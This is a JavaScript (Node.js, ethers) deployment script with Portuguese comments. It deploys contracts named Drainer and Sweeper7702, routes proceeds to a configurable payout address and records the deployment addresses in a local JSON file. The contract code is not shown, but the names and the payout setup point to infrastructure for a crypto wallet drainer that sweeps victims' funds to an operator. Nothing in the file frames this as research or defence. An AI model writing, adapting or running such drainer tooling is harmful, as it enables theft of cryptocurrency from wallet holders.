import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { ContractFactory } from "ethers";
import { loadEnv, SWEEPER_ABI } from "./lib.mjs";

const artifacts = {
  drainer: JSON.parse(readFileSync("out/Drainer.sol/Drainer.json", "utf8")),
  sweeper: JSON.parse(readFileSync("out/Sweeper7702.sol/Sweeper7702.json", "utf8")),
};

const { wallet, provider } = loadEnv();
if (!wallet) throw new Error("PRIVATE_KEY ausente");

const balance = await provider.getBalance(wallet.address);
console.log(`operador ${wallet.address} | saldo ${balance} wei | rede ${(await provider.getNetwork()).chainId}`);

const payout = process.env.PAYOUT || wallet.address;
console.log(`payout ${payout}`);

// nonce explicito: sem isso o RPC pode devolver o pending desatualizado entre os 3 txs
let nonce = await wallet.getNonce();

const drainer = await new ContractFactory(artifacts.drainer.abi, artifacts.drainer.bytecode, wallet).deploy({ nonce: nonce++ });
await drainer.waitForDeployment();
const drainerAddress = await drainer.getAddress();

const sweeper = await new ContractFactory(artifacts.sweeper.abi, artifacts.sweeper.bytecode, wallet).deploy({ nonce: nonce++ });
await sweeper.waitForDeployment();
const sweeperAddress = await sweeper.getAddress();

if (payout !== wallet.address) {
  await (await drainer.setPayout(payout, { nonce: nonce++ })).wait();
}

const data = { drainer: drainerAddress, sweeper: sweeperAddress, operator: wallet.address, payout, chainId: Number((await provider.getNetwork()).chainId) };
// o deploy NOVO tem de vencer; antes o merge deixava o arquivo antigo ganhar e o deploy local ficava invisivel
const merged = existsSync(".deployments.json") ? { ...JSON.parse(readFileSync(".deployments.json", "utf8")), ...data } : data;
writeFileSync(".deployments.json", JSON.stringify(merged, null, 2));

console.log(JSON.stringify(merged, null, 2));
